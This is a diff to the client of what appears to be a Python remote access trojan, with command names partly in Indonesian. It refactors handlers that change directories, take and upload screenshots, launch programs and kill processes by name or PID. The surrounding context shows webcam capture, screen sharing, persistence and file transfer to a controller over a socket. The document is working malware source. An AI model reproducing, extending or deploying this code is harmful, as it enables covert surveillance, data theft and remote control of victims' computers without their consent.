@@ -24,6 +24,39 @@ import ctypes
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ip = '127.0.0.1'
 
+def change_directory(cmd):
+    try:
+        os.chdir(cmd)
+        cur_dir = os.getcwd()
+        sok.sendall(f"{cur_dir}".encode())
+    except:
+        sok.sendall("Can't change directory".encode())
+        pass
+
+def screen_shot():
+    ss = pyautogui.screenshot()
+    ss.save('ss.png')
+    upload_file('ss.png')
+    os.remove("ss.png")
+
+def execute(cmd):
+    if shutil.which(cmd):
+        os.system(f"start {cmd}")
+    else:
+        pass
+
+def kill(cmd):
+    if shutil.which(cmd):
+        os.system(f"taskkill /IM {cmd} /F")
+    else:
+        pass
+
+def pidkill(cmd):
+    try:
+        os.system(f"taskkill /PID {cmd} /F")
+    except:
+        return
+
 def getpid():
     status = os.getpid()
     stat = f"{status}"
@@ -230,14 +263,7 @@ def jalankan_perintah():
         if perintah == 'clear':
             pass
         elif perintah[:3] == 'cd ':
-            try:
-                os.chdir(perintah[3:])
-            except FileNotFoundError:
-                pass
-            except PermissionError:
-                pass
-            except Exception:
-                pass
+            change_directory(perintah[3:])
         elif perintah[:8] == 'download':
             upload_file(perintah[9:])
         elif perintah[:6] == 'upload':
@@ -253,10 +279,7 @@ def jalankan_perintah():
         elif perintah == 'start_cam':
             byte_stream()
         elif perintah == 'screen_shot':
-            ss = pyautogui.screenshot()
-            ss.save('ss.png')
-            upload_file('ss.png')
-            os.remove("ss.png")
+            screen_shot()
         elif perintah == 'screen_share':
             send_screen_record(ip=ip, port=9991)
         elif perintah[:11] == 'persistence':
@@ -271,15 +294,11 @@ def jalankan_perintah():
         elif perintah == 'snap_cam':
             send_camera_image(ip=ip, port=9993)
         elif perintah[:7] == 'execute':
-            if shutil.which(perintah[8:]):
-                os.system(f"start {perintah[8:]}")
-            else:
-                pass
+            execute(perintah[8:])
         elif perintah[:4] == 'kill':
-            if shutil.which(perintah[5:]):
-                os.system(f"taskkill /IM {perintah[5:]} /F")
-            else:
-                pass
+            kill(perintah[5:])
+        elif perintah[:7] == 'pidkill':
+            pidkill(perintah[8:])
         elif perintah == 'getuid':
             send_status_priv()
         elif perintah == 'getpid':
